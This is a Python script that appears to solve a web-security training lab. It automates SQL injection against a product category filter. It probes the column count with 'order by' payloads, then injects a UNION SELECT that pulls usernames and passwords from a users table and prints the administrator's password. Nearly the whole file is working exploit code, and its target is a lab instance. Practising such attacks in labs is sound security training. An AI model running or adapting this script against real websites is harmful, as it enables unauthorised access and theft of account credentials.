import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup

# The script when run will pass through the below proxy settings
# proxies = {'http': 'http://127.0.0.1:8080', 'https': 'https://127.0.0.1:8080'}
proxies = None  # Disabled proxy - set to proxies config above if needed

def exploit_sqli_get_column_count(url, sqli_payload):
    path = "/filter?category=Gifts"
    for i in range(1, 51):  # Testing for column counts from 1 to 20
        test_payload = f"{sqli_payload}{i}-- "
        full_url = f"{url}{path}{test_payload}"
        response = requests.get(full_url, verify=False, proxies=proxies)
        if response.status_code != 200:
            return i - 1  # Return the last successful column count
    return None  # If no errors were encountered, return None

def exploit_sqli_get_admin_password(url, sqli_payload):
    path = "/filter?category=Gifts"
    noOfColumns = exploit_sqli_get_column_count(url, sqli_payload)
    if noOfColumns is not None:
        payload_list = ["NULL"] * noOfColumns
        payload_list[0] = "username"
        payload_list[1] = "password"
        data_exfiltration_payload = f"'UNION select {', '.join(payload_list)} from users--"
        response = requests.get(url + path + data_exfiltration_payload, verify=False, proxies=proxies)
        result = response.text
        if "administrator" in result:
            print("[+] Successfully retrieved admin credentials:")
            soup = BeautifulSoup(result, 'html.parser')
            admin_password = soup.find(string="administrator").parent.find_next_sibling().text
            print(f"[+] Admin Password: {admin_password}")
            return True
        return False

if __name__ == "__main__":
    try:
        # url = sys.argv[1].strip()  # Get the URL from command line arguments
        url = "https://0ad600f40452a855800c5d99002b00fc.web-security-academy.net"
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(1)
    print("[+] Figuring out number of columns...")
    sqli_payload = "'order+by+"
    if(exploit_sqli_get_admin_password(url, sqli_payload)):
        print("[+] The site appears to be vulnerable to SQL Injection and admin credentials were retrieved.")
    else:
        print("[-] The site does not appear to be vulnerable to SQL Injection or admin credentials could not be retrieved.")  
